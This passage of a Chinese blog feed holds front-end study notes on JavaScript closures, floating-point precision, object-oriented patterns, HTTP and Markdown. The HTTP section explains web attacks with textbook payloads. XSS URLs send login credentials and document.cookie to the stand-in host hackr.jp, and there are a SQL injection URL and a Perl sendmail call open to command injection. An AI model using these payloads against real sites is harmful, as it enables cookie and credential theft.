//&quot;Nicholas&quot;person.setName(&quot;Greg&quot;);alert(person.getName()); //&quot;Greg&quot; 在构造函数外部没有办法访问name 静态私有变量123456789101112131415(function()&#123; //私有变量和私有函数 var privateVar = 10; function privateFunc()&#123; return false; &#125; //构造函数 MyObject = function()&#123; &#125;; //没有使用var，所以声明的是全局的类 //公有/特权方法 MyObject.prototype.publicMethod = function()&#123; privateVar ++; return privateFunc(); &#125;;&#125;)(); 该模式与构造函数定义区别在于，其私有变量和函数是由实例共享的1234567891011121314151617181920(function()&#123; var name = &quot;&quot;; Person = function(value)&#123; name = value; &#125;; Person.prototype.getName = function()&#123; return name; &#125;; Person.prototype.setName = function(value)&#123; name = value; &#125;;&#125;)();var person2 = new Person(&quot;Van&quot;);alert(person1.getName()); //&quot;Van&quot;person1.setName(&quot;Greg&quot;);alert(person1.getName()); //&quot;Greg&quot;var person2 = new Person(&quot;John&quot;);alert(person1.getName()); //&quot;John&quot;alert(person2.getName()); //&quot;John&quot;//name为共享属性 模块模式1234567891011121314var singleton = function()&#123; var privateVar = 10; function privateFun()&#123; return false; &#125; //特权/公有方法和属性 return&#123; publicProperty : true, publicMethod ：function()&#123; privateVar++; return privateFunc(); &#125; //对象字面量是单例的公共接口 &#125;;&#125;(); 增强的模块模式增强模块模式适合那些单例必须是某种类型的实例，同时还必须增加某些属性和方法对其加以增强的情况。12345678910111213var singleton = function()&#123; var privateVar = 10; function privateFun()&#123; return false; &#125; var object = new CustomType(); object.publicProperty = true; object.publicMethod = function()&#123; privateVar++; return privateFun(); &#125;; return object;&#125;();]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS精度丢失问题]]></title>
    <url>%2FJS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了parseFloat()方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。 JS浮点数精度丢失的原因由于计算机的二进制实现和位数限制，有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JS 遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。 1位用来表示符号位 11位用来表示指数 52位表示尾数 因为在计算机最底层，数值的运算和操作都是采用二进制实现的，所以计算机没有办法精确表示浮点数，而只能用二进制近似相等的去表示浮点数的小数部分。 120.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环） 当进行计算或其他操作时时，四舍五入（逢1进，逢0舍）将会导致最终的运算结果存在偏差。 而大整数也存在同样的问题，因为表示尾数的尾数只有52位，因此 JS 中能精准表示的最大整数是 Math.pow(2, 53)，即十进制9007199254740992。 12345679007199254740992 &gt;&gt; 10000000000000...000 // 共计 53 个 09007199254740992 + 1 &gt;&gt; 10000000000000...001 // 中间 52 个 09007199254740992 + 2 &gt;&gt; 10000000000000...010 // 中间 51 个 09007199254740992 + 1 // 丢失 //9007199254740992 9007199254740992 + 2 // 未丢失 //9007199254740994 9007199254740992 + 3 // 丢失 //9007199254740992 9007199254740992 + 4 // 未丢失 //9007199254740996 由此可知，十进制中的有穷数值，在计算机底层，可能是0、1循环的无限数值。 在Java、C、C++中，均有对浮点数值的特殊处理，如Java的BigDecimal类型就是用来解决这一浮点数问题。 常见的出错场合浮点数计算、比较：10.1 + 0.2 != 0.3 // true 大整数计算、比较：普通的整数计算比较不太容易出错，除非计算范围超出 Math.pow(2, 53) 19999999999999999 == 10000000000000001 // true 多位数字符数值转换：这种情况在一些金额的计算中较容易出现，但也是最容易被忽视的一种，当用户在输入框中输入一个位数较多的字符串（不仅仅包含大数值，小数点后位数过长也包含在这一案例中），并在前台使用JS将其转换为数值，得到的结果往往是四舍五入带有偏差的值 1234parseFloat(0.9); //0.9parseFloat(9999999999999999.9) //10000000000000000parseInt(&quot;9999999999999999&quot;); //10000000000000000parseFloat(9.999999999999999); //10 toFixed不会四舍五入：12var num = 1.335;num.toFixed(2); //1.33 解决方案浮点数计算、比较：通常解决这一问题，采用的都是将浮点部分转换成整数后进行计算 12345678910111213141516171819202122232425262728293031323334353637//浮点数转换为整数function toInt(num)&#123; var rel = &#123;&#125;; var str,pos,len,times; str = (num &lt; 0) ? -num + &apos;&apos; : num + &apos;&apos;; pos = str.indexOf(&apos;.&apos;); len = str.substr(pos+1).length; times = Math.pow(10, len); rel.times = times; rel.num = num; return rel;&#125;//计算过程function operate(a,b,op)&#123; var d1 = toInt(a); var d2 = toInt(b); var max = d1.times &gt; d2.times ? d1.times : d2.times; var rel; switch(op)&#123; case &quot;+&quot; : rel = (d1.num * max + d2.num * max) / max; break; case &quot;-&quot; : rel = (d1.num * max - d2.num * max) / max; break; case &quot;*&quot; : rel = ((d1.num * max) * (d2.num * max)) / (max * max); break; case &quot;/&quot; : rel = (d1.num * max) / (d2.num * max); break; &#125; return rel;&#125;var rel = operate(0.3,0.1,&quot;+&quot;); //0.4 多位数数值转换：前台不对这类字符串进行数值转换，传到后台后，由后台进行处理 toFix的修复：123456function toFixed(num, s) &#123; var times = Math.pow(10, s) var des = num * times + 0.5 des = parseInt(des, 10) / times return des + &apos;&apos;&#125;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS面向对象程序设计]]></title>
    <url>%2FJS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html</url>
    <content type="text"><![CDATA[属性类型数据属性 属性名 解释 [[Configurable]] 表示能否通过delete删除属性从而重新定义属性，默认为true [[Enumerable]] 表示能否通过for-in循环返回属性，默认为true [[Writable]] 表示能否修改属性的值，默认为true [[Value]] 包含这个属性的数值，默认为undefined 12345678var person = &#123;&#125;;Object.defineProperty(person,&quot;name&quot;,&#123; writable: false, value: &quot;Nicholas&quot;&#125;);alert(person.name); // &quot;Nicholas&quot;person.name = &quot;Greg&quot;;alert(person.name); // &quot;Nicholas&quot;,通过修改属性使之不能被修改 访问器属性 属性名 解释 [[Configurable]] 表示能否修改属性的特性，或者能否把属性修改为数据属性，默认为true [[Enumerable]] 表示能否通过for-in循环返回属性，默认为true [[Get]] 在读取属性时调用的函数，默认为undefined [[Set]] 在写入属性时调用的函数，默认为undefined 1234567891011121314151617var book = &#123; _year: 2004, edition: 1&#125;;Object.defineProperty(book,&quot;year&quot;,&#123; get: function()&#123; return this._year; &#125; set: function(newValue)&#123; if(newVale &gt; 2004)&#123; this._year = newValue; this.edition += newValue - 2004; &#125; &#125;&#125;);book.year = 2005;alert(book.edition); // 2,访问属性只能用Object.defineProperty定义 定义多个属性使用Object.defineProperty方法定义多个属性 1234567891011var book = &#123;&#125;;Object.defineProperty(book,&#123; _year: &#123; writable: true, value: 2004 &#125;, edition: &#123; wirtable: true, value: 1 &#125;&#125;); 读取属性的特性1234var descriptor = Object.getOwnPropertyDescriptor(book,&quot;_year&quot;);alert(descriptor.value); //2004alert(descriptor.configurable); //falsealert(typeof descriptor.get); //&quot;undefined&quot; 创建对象工厂模式抽象了创建具体对象的过程 12345678910function createPerson(name,age,job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function()&#123; alert(this.name); &#125;; return o;&#125; 构造函数模式1234567891011121314function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = function()&#123; alert(this.name); &#125;;&#125;var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);// 使用call实现在特殊作用于中调用Person函数var o = new Object();Person.call(o,&quot;Kristen&quot;,25,&quot;Nurse&quot;);o.sayName(); //&quot;Kristen&quot; 此方法特点： 没有显示地创建对象 直接将属性方法赋给了his对象 没有return语句 不同实例上的同名函数每次都是新创建初始化，他们之间不相等最好将函数定义转移到构造函数外 12345678910function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = sayName;&#125;function sayName()&#123; alert(this.name);&#125;var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;); 原型模式创建的每个函数都有一个prototype属性，这个属性指向一个对象，该对象的用途是包含可以由特定类型的所有实例共享的属性和方法。 12345678910function Person()&#123;&#125;Person.prototype.name = &quot;Nicholas&quot;;Person.prototype.age = 29;Person.prototype.job = &quot;Software Engineer&quot;;Person.prototype.sayName = function()&#123; alert(this.name);&#125;;var person1 = new Person();person1.sayName(); //&quot;Nicholas&quot;,来自原型 可以通过isPrototypeOf来确定对象之间是否存在这种关系 123alert(Person.prototype.isPrototypeOf(person1)); //truealert(Person.getPrototypeOf(person) == Person.prototype); //truealert(Obeject.getPrototypeOf(person1).name); //&quot;Nicholas&quot; 可以通过hasOwnProperty来检测一个属性是否存在于实例中，只有存在于实例中，才会返回true 1234567alert(person1.hasOwnPrototype(&quot;name&quot;)); //falseperson1.name = &quot;Greg&quot;;alert(person1.name); //&quot;Greg&quot;,来自实例alert(person1.hasOwnPrototype(&quot;name&quot;)); //truedelete person1.name;alert(person1.name); //&quot;Nicholas&quot;,来自原型alert(person1.hasOwnPrototype(&quot;name&quot;)); //false in操作符会在通过对象能够访问给定属性时返回true，无论其在实例还是原型中 1alert(&quot;name&quot; in person1); //true for-in循环，返回的是所有能够通过对象访问、可枚举的属性 12345678910var o = &#123; toString: function()&#123; return &quot;My Object&quot;; &#125;&#125;;for(var prop in o)&#123; if(pop == &quot;toString&quot;)&#123; alert(&quot;Found toString&quot;); //IE中不会显示，认为原型中的toString被屏蔽 &#125;&#125; 使用Object.key可以取得所有可枚举的实力属性 1234567var keys = Object.keys(Person.prototype);alert(keys); //&quot;name,age,job,sayName&quot;var p1 = new Person();p1.name = &quot;Rob&quot;;p1.age = 31;var p1Keys = Object.keys(p1);alert(p1Keys); //&quot;name,age&quot; 更简单的原型创建语法 1234567891011function Person()&#123;&#125;Person.prototype = &#123; name: &quot;Nicholas&quot;, age: 29, job: &quot;Software Engineer&quot;, sayName: function()&#123; alert(this.name); &#125;&#125;// 此时constructor不再指向Person了，如果需要可以将constructor的值设为Person 对原型对象所做的修改可以立即从实例上反映出来 12345var friend = new Person();Person.prototype.sayHi = function()&#123; alert(&quot;Hi&quot;);&#125;friends.sayHi(); //&quot;Hi&quot; 但重写整个原型对象就不可以了，此时constructor指向新创建的对象 12345678910111213var Person()&#123;&#125;var friend = new Person();Person.prototype = &#123; constructor: Person, name: &quot;Nicholas&quot;, age: 29, job: &quot;Software Engineer&quot;, sayName: function()&#123; alert(this.name); &#125;&#125;;friends.sayName(); //error 通过原生对象原型，可以取得所有默认方法的引用，而且也可以定义新方法 12345String.prototype.startsWith = function(text)&#123; return this.indexOf(text) == 0;&#125;;var msg = &quot;Hello world&quot;;alert(msg.startsWith(&quot;Hello&quot;)); //true 原生对象存在缺点，包含引用类型值的属性将被所有实例共享，例如属性中包含数组 组合使用构造函数和原型模式构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性 1234567891011121314151617function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; this.friends = [&quot;Shelly&quot;,&quot;Court&quot;];&#125;Person.prototype = &#123; constructor: Person, sayName: function()&#123; alert(this.name); &#125;&#125;;var person1 = new Person(&quot;Nicholas&quot;,29,&quot;SoftWare Engineer&quot;);var person2 = new Person(&quot;Greg&quot;,27,&quot;Doctor&quot;);person1.friends.push(&quot;Van&quot;);alert(person1.friends); //&quot;Shelly,Court,Van&quot;alert(person2.friends); //&quot;Shelly,Court&quot; 动态原型模式通过检查某个应该存在的方法是否有效，来决定是否需要初始化原型 12345678910function Person(name,age,job)&#123; this.name = name; this.age = age; this.job = job; if(typeof this.sayName != &quot;function&quot;)&#123; Person.prototype.sayName = function()&#123; alert(this.name); &#125; &#125;&#125; 寄生构造函数模式该模式用来为对象创建构造函数，以此创建一个具有额外方法的特殊对象 12345678910function SpecialArray()&#123; var values = new Array(); values.push.apply(values,arguments); values.toPipedString = function()&#123; return this.join(&quot;|); &#125;; return values;&#125;var colors = new SpecialArray(&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;);alert(colors.toPipedString()); //&quot;red|blue|green&quot; 稳妥构造函数模式稳妥对象最适合在一些安全的环境中（这些环境中会禁止使用this和new）或者防止数据被其他应用程序（如Mashup程序）改动时使用 1234567function Person(name,age,job)&#123; var o = new Object(); o.sayName = function()&#123; alert(name); //name只能通过sayName方法访问 &#125;; return 0;&#125; 继承原型链实现原型链的基本模式 123456789101112131415function SuperType()&#123; this.property = true;&#125;SuperType.prototype.getSuperValue = function()&#123; return this.property;&#125;;function SubType()&#123; this.subproperty = false;&#125;SubType.prototype = new SuperType();SubType.prototype.getSubValue = function()&#123; return this.subproperty;&#125;;var instance = new SubType();alert(instance.getSuperValue()); //true 以上代码中，可用instanceof和isPrototypeOf来确定原型和实例之间的关系 1234alert(instance instanceOf Object); //truealert(instance instanceOf SuperType); //truealert(instance instanceOf SubType); //truealert(Object.prototype.isPrototypeOf(instance)); //true 通过原型链实现继承时，不能使用对象字面量创建原型方法，因为这样会重写原型链，原型链中存在问题，包含引用类型值的原型属性会被所有实例共享 借用构造函数1234567891011121314151617181920212223function SuperType()&#123; this.colors: [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125;function SubType()&#123; SuperType.call(this); //执行了SuperType中定义的所有对象初始化代码&#125;var instance1 = new SubType();instance1.colors.push(&quot;black&quot;);alert(instance1.colors); //&quot;red,blue,green,black&quot;var instance2 = new SubType();alert(instance2.colors); //&quot;red,blue,green&quot;// 还可以传递参数function SuperType(name)&#123; this.name = name;&#125;function SubType()&#123; SuperType.call(this,&quot;Nicholas&quot;); this.age = 29;&#125;var instance = new SubType();alert(instance.name); //&quot;Nicholas&quot;alert(instance.age); //29 如同仅仅借用构造函数，则无法函数复用 组合继承使用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例的继承 12345678910111213141516171819202122232425function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125;SuperType.prototype.sayName = function()&#123; alert(this.name);&#125;function SubType(name,age)&#123; SuperType.call(this,name); //继承属性 this.age = age;&#125;SubType.prototype = new SuperType(); //继承方法SubType.prototype.constructor = SubType;SubType.prototype.sayAge = function()&#123; alert(this.age);&#125;;var instance1 = new SubType(&quot;Nicholas&quot;,29);instance1.colors.push(&quot;black&quot;);alert(instance1.colors); //&quot;red,blue,green,black&quot;instance1.sayName(); //&quot;Nicholas&quot;instance1.sayAge(); //29var instance2 = new SubType(&quot;Greg&quot;,27);alert(instance2.colors); //&quot;red,blue,green&quot;instance2.sayName(); //&quot;Greg&quot;instance2.sayAge(); //27 原型式继承1234567891011var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]&#125;;var anotherPerson Object(person);anotherPerson.name = &quot;Greg&quot;;anotherPerson.friends.push(&quot;Rob&quot;);var getAnotherPerson = Object(person);getAnotherPerson.name = &quot;Linda&quot;;getAnotherPerson.friends.push(&quot;Barbie&quot;);alert(person.friends); //&quot;Shelby,Court,Van,Rob,Barbie&quot; ES5新增Object.create()方法规范化了原型式继承，在传入一个参数时与Object方法相同 12345678910var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]&#125;;var anotherPerson = Object.create(person,&#123; name: &#123; value: &quot;Greg&quot; &#125;&#125;);alert(anotherPerson.name); //&quot;Greg&quot; 寄生式继承创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象 1234567function createAnother(original)&#123; var clone = Object(original); //创建一个新对象，Object函数不是必需的 clone.sayHi = function()&#123; alert(&quot;Hi&quot;); &#125;; return clone;&#125; 寄生组合继承1234567891011121314151617181920fucntion inheritP(subType,superType)&#123; var prototype = Object(superType.prototype); prototype.constructor = subType; subType.prototype = prototype;&#125;function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125;SuperType.prototype.sayName = function()&#123; alert(this.name);&#125;;function SubType(name,age)&#123; SuperType.call(this.name); this.age = age;&#125;inheritP(SubType,SuperType);SubType.prototype.sayAge = function()&#123; alert(this.age);&#125;;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP原理]]></title>
    <url>%2FHTTP%E5%8E%9F%E7%90%86.html</url>
    <content type="text"><![CDATA[TCP/IP协议族重要思想:分层分层： 应用层： HTTP协议：生成针对目标web服务器的HTTP请求报文。FTP协议：文件传输协议。DNS协议： 域名解析协议。 传输层： UDP协议：用户数据报协议。TCP协议：传输控制协议：利用三次握手策略。 网络层: IP协议：把各种数据包传送给对方。ARP协议：解析地址协议，通过IP地址查出对应MAC地址。 链路层：用于处理网络的硬件部分。 URI/URL URI：用字符串标识某一互联网资源。 URL： 互联网上所处的位置表示资源地点。1https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1 组成 解释 https 协议方案 user:pass 登录信息 wwww.example.com 服务器地址 :80 端口号 dir/index.html 文件路径 uid=1 查询字符串 #ch1 片段标识符 HTTP协议请求响应： 请求报文： 123456POST /from/entry HTTP/1.1Host: hacker.jpConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 16name: ueno&amp;age=37 响应报文： 12345HTTP/1.1 200 OKDate: Tue, 10 Jul 2012 06:50:15 GMTContent-Length: 362Content-Type: text/html&lt;html&gt; ...... HTTP可使用方法： GET：获取资源，目的是获取响应的主体内容。 POST：传输实体主体。 PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。 HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。 DELETE：删除文件，删除URI指定资源。 OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。 TRACE：追踪路径，用来确认连接过程中发生的一系列操作。 CONNECT：要求用隧道协议连接代理。 状态码： 状态码类别： 状态码 分类 解释 1xx Infromational(信息性状态码) 接收的请求正在处理 2xx Success(成功状态码) 请求正常处理完成 3xx Redirectiion(重定向状态码) 需要进行附加操作以完成请求 4xx Client Error(客户端错误状态码) 服务器无法处理请求 5xx Server Error(服务器错误状态码) 服务器处理请求出错 常用状态码： 状态码 解释 200 OK 从客户端发来的请求在服务端被正常处理了 204 No Content 服务器接受的请求已成功处理，但返回的响应报文不含实体主体 206 Partial Content 客户端进行了范围请求 301 Moved Permanently 永久性重定向 302 Found 临时性重定向，请求的资源已被分配了新的URI 303 See Other 与302有着相同功能，但明确要求采用GET获取资源 304 Not Modified 客户端发送附带条件请求时，服务端允许请求访问，但未满足条件 307 Temporary Redirect 与302有相同含义，但不会使POST变成GET 400 Bad Request 请求报文种存在语法错误 401 Unauthorized 需通过HTTP认证，若已进行过一次请求，则表示认证失败 403 Forbidden 请求资源的访问被服务器拒绝 404 Not Found 服务器上无法找到请求的资源 500 Internal Server Error 服务器端在执行请求时发生了错误 503 Service Unavailable 服务器暂处于超负载或正在进行停机维护，无法处理请求 通信数据转发程序：代理： 作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。 使用理由： 利用缓存技术减少网络带宽的流量组织内部针对特定网站的访问控制以获取访问日志为主要目的 分类： 缓存代理：会预先将资源的副本保存在代理服务器透明代理：不对报文做任何加工的代理类型为透明代理 网关： 作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。 隧道： 作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。 HTTP首部字段：类型： 通用首部字段：请求报文和响应报文两方都会使用的首部 请求首部字段：请求报文使用的首部 响应首部字段：响应报文使用的首部 实体首部字段：补充了资源内容更新时间等实体有关的信息 End-to-end首部和Hop-to-hop首部： 端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。 逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。 通用首部字段： Cache-Control：操作缓存的工作机制 Connection：控制不再转发给代理的首部字段，管理持久连接 Date：表明创建HTTP报文的日期和时间 Pragma：要求所有的中间服务器不返回缓存的资源 Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码 Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信 Via：追踪客户端与服务器之间的请求和响应报文的传输路径 Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告 请求首部字段： Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序 Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序 Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序 Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序 Authorization：通知服务器用户代理的认证信息 Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed From：使用用户代理的用户的电子邮件地址 Host：请求资源所处的互联网主机名和端口号 If-Match：匹配资源所用的实体标记值 If-Modified-Since：请求指定日期后更新过的资源 If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求 If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理 If-Unmodified-Since：请求在指定日期后未发生更新的资源 Max-Forwards：指定可经过的服务器最大数目 Proxy-Authorization：通知服务器认证所需要的信息 Range：通知服务器资源的指定范围 Referer：通知服务器请求的原始资源的URI TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序 User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器 响应首部字段： Accept-Ranges：用来告知客户端服务器是否能处理范围请求 Age：告知客户端源服务器在多久前创建了响应，单位为妙 Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式 Location：将响应接收方引导至某个与请求URI位置不同的资源 Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端 Retry-After：告知客户端在多久之后再次发送请求 Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息 Vary：可对缓存进行控制 www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案 实体首部字段： Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法 Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式 Content-Language：告知客户端实体主体使用的自然语言 Content-Length：表明了实体主体部分的大小 Content-Location：与报文主体部分相对应的URI Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达 Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求 Content-Type：说明了实体主体内对象的媒体类型 Expires：将资源失效的日期告知客户端 Last-Modified：指明资源最终修改的时间 为Cookie服务的首部字段： Set-Cookie： expires属性：指定浏览器可发送Cookie的有效期path属性：限制指定Cookie的发送范围的文件目录domain属性：作为Cookie适用对象的域名secure属性：仅在HTTPS安全通信时才会发送CookieHttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问 Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie 其他首部字段： X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击 X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关 DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法 P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式 HTTP和HTTPSHTTP的缺点： 通信使用明文(不加密)，内容可能会被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能已遭篡改 HTTPS：定义： HTTPS实在HTTP通信接口部分用SSL和TLS协议代替 添加了加密及认证机制的HTTP成为HTTPS 安全通信机制： HTTP认证： Basic认证：采用Base64编码，发送明文密码 Digest认证：使用质询/响应方式 SSL客户端认证：借由HTTPS的客户端证书完成认证 基于表单认证：最常用，并用Cookie来管理Session会话 基于HTTP的功能追加协议SPDYHTTP的瓶颈： 一条连接上只可发送一个请求 请求只能从客户端开始，客户端不可以接收响应以外的指令 请求/响应首部未经压缩就发送，首部信息越多延迟越大 发送冗长的首部，每次互相发送相同的首部造成的浪费较多 可任意选择数据压缩格式，非强制压缩发送 解决方法： Ajax：异步请求实现局部刷新，但可能存在大量请求产生 Comet：一旦服务器内容更新了，可以立即反馈给客户端 SPDY： 以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接HTTP 应用层SPDY 会话层SSL 表示层TCP 传输层多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求赋予请求优先级：可以给请求逐个分配优先级顺序压缩HTTP首部：压缩HTTP请求和响应的首部推送功能：支持服务器主动向客户端推送数据的功能服务器提示功能：服务器可以主动提示客户端请求所需的资料 WebSocket定义: 即Web浏览器与Web浏览器服务器之间全双工通信标准 特点: 推送功能：支持由服务器向客户端推送数据的推送功能 减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态 WebSocketAPI: JavaScript可调用API，实现WebSocket协议下全双工通信 12345678var socket = new WebSocket(&apos;ws://game.example.com:12010/updates&apos;);socket.onopen = function()&#123; setInternal(function()&#123; if(socket.bufferedAmout == 0)&#123; socket.send(getUpdateData()); &#125; &#125;,50);&#125; WebDAV定义: WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统 引入概念: 集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作 资源(Resource)：把文件或集合称为资源 属性(Property)：定义资源的属性 锁(Lock)：把文件设置成无法编辑状态 新增方法及状态码: PROPFIND：获取属性 PROPPATCH：修改属性 MKCOL：创建集合 COPY：复制资源及属性 MOVE：移动资源 LOCK：资源加锁 UNLOCK：资源解锁 状态码 解释 102 Processing 可正常处理请求，但目前是处理中状态 207 Multi-Status 存在多种状态 422 Unprocessible Entity 格式正确，内容有误 423 Locked 资源已被加锁 424 Failed Dependency 处理与某请求关联的请求失败，因此不再维持依赖关系 507 Insufficient Storage 保存空间不足 Web的攻击技术跨站脚本攻击(XSS)定义: 是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击 造成影响: 利用虚假输入表单骗取用户个人信息 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求 显示伪造的文章或图片 攻击案例: 获取用户登录信息 1http://example.jp/Login?ID=&quot;&gt;&lt;script&gt;var tf=document.getElemenById(&apos;login&apos;);tf.action=&apos;http://hackr.jp/pwget&apos;;tf.method=&apos;get&apos;;&lt;/script&gt;&lt;span ts=&quot; 对用户Cookie的窃取攻击 123456http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;xss.js文件：var content = escape(document.cookie);document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);document.write(content);document.write(&quot;&gt;&quot;); SQL攻击定义: 指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击 造成影响: 非法查看或篡改数据库内的数据 规避认证 执行和数据库服务器业务关联的程序等 攻击案例:12http://example.com/search?q=marry&apos;--select * from bookTbl where author=&quot;marry&quot; --&apos; and flag=1; OS命令注入攻击定义: 指通过Web应用，执行非法的操作系统命令达到攻击的目的 攻击案例:123my $adr = $q -&gt; param(&apos;mailaddress&apos;);open(MAIL,&quot;|/user/sbin/senmail $adr&quot;);print MAIL &quot;Form:info@example.com\n&quot;; HTTP首部注入攻击定义: 是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击 邮件首部注入攻击定义: 是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击 目标遍历攻击定义: 是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击 跨站点请求伪造(CSRF)定义: 指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新 点击劫持定义: 指利用透明的按钮或链接做成陷阱覆盖在Web页面之上 DoS攻击定义: 是一种让运行中的服务呈停止状态的攻击]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown常用语法]]></title>
    <url>%2FMarkdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html</url>
    <content type="text"><![CDATA[标题在Markdown中，标题一共分为六级，只需在文字前加上 # 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码： 123456# h1## h2### h3#### h4##### h5###### h6 分级标题与标题作用类似，= 和 - 最少可只写一个，兼容性一般。代码： 1234一级标题============二级标题------------ 目录根据标题生成目录，兼容性一般，nexT主题已经开启自动生成目录。代码： 1[TOC] 引用引用可以分为单行引用和多行引用（引用块），同时只要根据层次加上 &gt; 就可以实现嵌套引用，引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。代码： 单行式1&gt; hello world! 效果： hello world! 多行式12&gt; hello world!brand new world! 或 12&gt; hello world!&gt; brand new world! 效果相同： hello world!brand new world! 嵌套式12&gt; hello world!&gt;&gt; brand new world! 效果： hello world! brand new world! 代码块代码块可分为行内代码块和多行代码块。代码： 行内代码1`&lt;div&gt;&lt;/div&gt;` 效果：&lt;div&gt;&lt;/div&gt; 代码块用三个反引号包裹一串代码，或者使用Tab缩进。注意要空开一行书写。效果： &lt;div&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;/div&gt; 